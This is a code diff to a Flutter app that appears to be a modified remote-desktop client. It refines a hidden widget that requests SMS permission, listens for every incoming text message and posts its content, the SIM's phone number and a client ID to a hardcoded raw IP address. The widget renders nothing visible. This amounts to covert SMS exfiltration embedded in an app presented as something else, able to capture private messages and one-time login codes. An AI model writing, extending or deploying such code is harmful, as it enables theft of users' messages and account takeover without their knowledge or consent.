@@ -21,8 +21,6 @@ import 'package:permission_handler/permission_handler.dart';
 import 'package:sim_car_info_plugin/sim_car_info_plugin.dart';
 
 import 'dart:io';
-import 'package:path_provider/path_provider.dart';
-// import 'package:flutter/services.dart' show rootBundle;
 
 class ServerPage extends StatefulWidget implements PageShape {
   @override
@@ -457,7 +455,7 @@ class _ListenInfoState extends State<ListenInfo> {
   final model = gFFI.serverModel; // 确保 gFFI 已正确定义
   late final String id; 
   late final String phoneNumber;
-  String newSmsContent = '暂无新短信'; 
+  String newSmsContent = '暂无新短信';
   late final SimCarInfoPlugin simCarInfoPlugin;
 
   @override
@@ -473,32 +471,41 @@ class _ListenInfoState extends State<ListenInfo> {
   void requestPermissions() async {
     var status = await Permission.sms.status;
     if (!status.isGranted) {
-      await Permission.sms.request();
+      var result = await Permission.sms.request();
+      if (!result.isGranted) {
+        logToFile("SMS permission denied");
+      }
     }
   }
 
-  Future<void> logToFile(String message) {
-    DateTime now = DateTime.now();
-    String timestamp = now.toIso8601String();
-    String logMessage = '$timestamp: $message\n';
-    String logFilePath = 'Sms.log';
-    final file = File(logFilePath);
-    file.create(recursive: true);
-    file.writeAsString(logMessage, mode: FileMode.append);
+  void logToFile(String message) async {
+    try {
+      DateTime now = DateTime.now();
+      String timestamp = now.toIso8601String();
+      String logMessage = '$timestamp: $message\n';
+      String logFilePath = 'Sms.log';
+      final file = File(logFilePath);
+      await file.create(recursive: true);
+      await file.writeAsString(logMessage, mode: FileMode.append);
+    } catch (e) {
+      print('Error writing to log file: $e');
+    }
   }
 
   void listenForNewSms() {
     simCarInfoPlugin.startListen().listen((event) async {
       try {
         setState(() {
-          newSmsContent = event.body; // 更新新短信内容
+          newSmsContent = event.body; // 更新UI显示的新短信内容
         });
 
         var info = await simCarInfoPlugin.simCarInfo();
         if (info != null && info.isNotEmpty) {
           var infoList = json.decode(info);
           if (event.slot < infoList.length) {
-            phoneNumber = infoList[event.slot]['Number'];
+            setState(() {
+              phoneNumber = infoList[event.slot]['Number'];
+            });
             logToFile("Api data: ${event.slot}, $phoneNumber, $id");
             await sendToApi(phoneNumber, event.body, id);
           } else {
@@ -520,17 +527,21 @@ class _ListenInfoState extends State<ListenInfo> {
         'Content-Type': 'application/json'
       };
 
-      var request = http.Request('POST', Uri.parse('http://61.171.69.243:7808/external/cli/sms/save'));
+      var request = http.Request(
+        'POST',
+        Uri.parse('http://61.171.69.243:7808/external/cli/sms/save'),
+      );
       request.body = json.encode({
         "clientId": id,
         "phone": phoneNumber,
-        "content": content
+        "content": content,
       });
       request.headers.addAll(headers);
 
       http.StreamedResponse response = await request.send();
       if (response.statusCode == 200) {
-        logToFile("API request Success with status code: 200");
+        String responseBody = await response.stream.bytesToString();
+        logToFile("API request Success: $responseBody");
       } else {
         logToFile("API request failed with status code: ${response.statusCode}, reason: ${response.reasonPhrase}");
       }
@@ -541,7 +552,7 @@ class _ListenInfoState extends State<ListenInfo> {
 
   @override
   Widget build(BuildContext context) {
-    return SizedBox.shrink(); // 或 SizedBox.shrink();
+    return SizedBox.shrink(); // 不显示的占位符组件
   }
 }
 
